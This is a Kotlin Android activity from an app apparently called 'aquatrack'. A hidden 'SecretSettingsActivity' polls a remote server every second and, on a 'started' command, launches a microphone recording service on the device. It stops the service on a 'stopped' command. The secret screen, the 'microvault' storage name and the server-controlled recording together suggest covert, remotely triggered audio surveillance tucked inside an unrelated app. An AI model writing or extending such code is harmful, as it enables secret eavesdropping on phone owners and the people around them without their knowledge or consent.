package com.example.aquatrack

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.example.aquatrack.api.RecordingApiService
import com.example.aquatrack.recording.AudioRecordingService
import com.example.aquatrack.util.NotificationHelper
import com.example.aquatrack.util.WindowManager

class SecretSettingsActivity : ComponentActivity() {
    private lateinit var requestAudioPermissionLauncher: androidx.activity.result.ActivityResultLauncher<String>
    private var pendingStartService = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Permission launcher for RECORD_AUDIO
        requestAudioPermissionLauncher = registerForActivityResult(
            ActivityResultContracts.RequestPermission()
        ) { isGranted ->
            if (isGranted && pendingStartService) {
                startAudioServiceInternal()
            }
            pendingStartService = false
        }

        // Configure window behavior
        WindowManager.setUpEdgeToEdge(this)

        setContent {
            MaterialTheme {
                val microPrefs = getSharedPreferences("microvault", MODE_PRIVATE)
                var phoneId by remember { mutableStateOf(microPrefs.getInt("phone_id", -1)) }
                var status by remember { mutableStateOf("Unknown") }
                val apiService = remember { RecordingApiService(this@SecretSettingsActivity) }

                // Periodically fetch status every second (suspend function)
                LaunchedEffect(Unit) {
                    while (true) {
                        // re-read phone_id each iteration in case it was created after login
                        phoneId = microPrefs.getInt("phone_id", -1)
                        if (phoneId != -1) {
                            status = apiService.getStatus(phoneId) ?: "Unknown"
                            // Start/stop service based on status
                            if (status == "started") {
                                if (ContextCompat.checkSelfPermission(this@SecretSettingsActivity, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                                    startAudioServiceInternal()
                                }
                            } else if (status == "stopped") {
                                stopService(Intent(this@SecretSettingsActivity, AudioRecordingService::class.java))
                            }
                        }
                        kotlinx.coroutines.delay(1000)
                    }
                }

                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    Column(
                        modifier = Modifier
                            .fillMaxSize()
                            .padding(16.dp),
                        horizontalAlignment = Alignment.CenterHorizontally,
                        verticalArrangement = Arrangement.Center
                    ) {
                        Text(
                            text = if (phoneId == -1)
                                "Device not registered"
                            else
                                "Device registered (ID: $phoneId)",
                            style = MaterialTheme.typography.titleMedium,
                            modifier = Modifier.padding(bottom = 32.dp)
                        )

                        Text(
                            text = "Recording Status: $status",
                            style = MaterialTheme.typography.bodyLarge,
                            modifier = Modifier.padding(bottom = 16.dp)
                        )

                        Button(
                            onClick = { checkAndStartAudioService() },
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(vertical = 8.dp)
                        ) {
                            Text("Start Service")
                        }

                        Button(
                            onClick = { stopService(Intent(this@SecretSettingsActivity, AudioRecordingService::class.java)) },
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(vertical = 8.dp)
                        ) {
                            Text("Stop Service")
                        }

                        OutlinedButton(
                            onClick = { finish() },
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(vertical = 8.dp)
                        ) {
                            Text("Close")
                        }
                    }
                }
            }
        }
    }

    private fun checkAndStartAudioService() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
            startAudioServiceInternal()
        } else {
            pendingStartService = true
            requestAudioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
        }
    }

    private fun startAudioServiceInternal() {
        // Ensure notification channel exists
        NotificationHelper.createNotificationChannel(this)

        val serviceIntent = Intent(this, AudioRecordingService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ContextCompat.startForegroundService(this, serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
}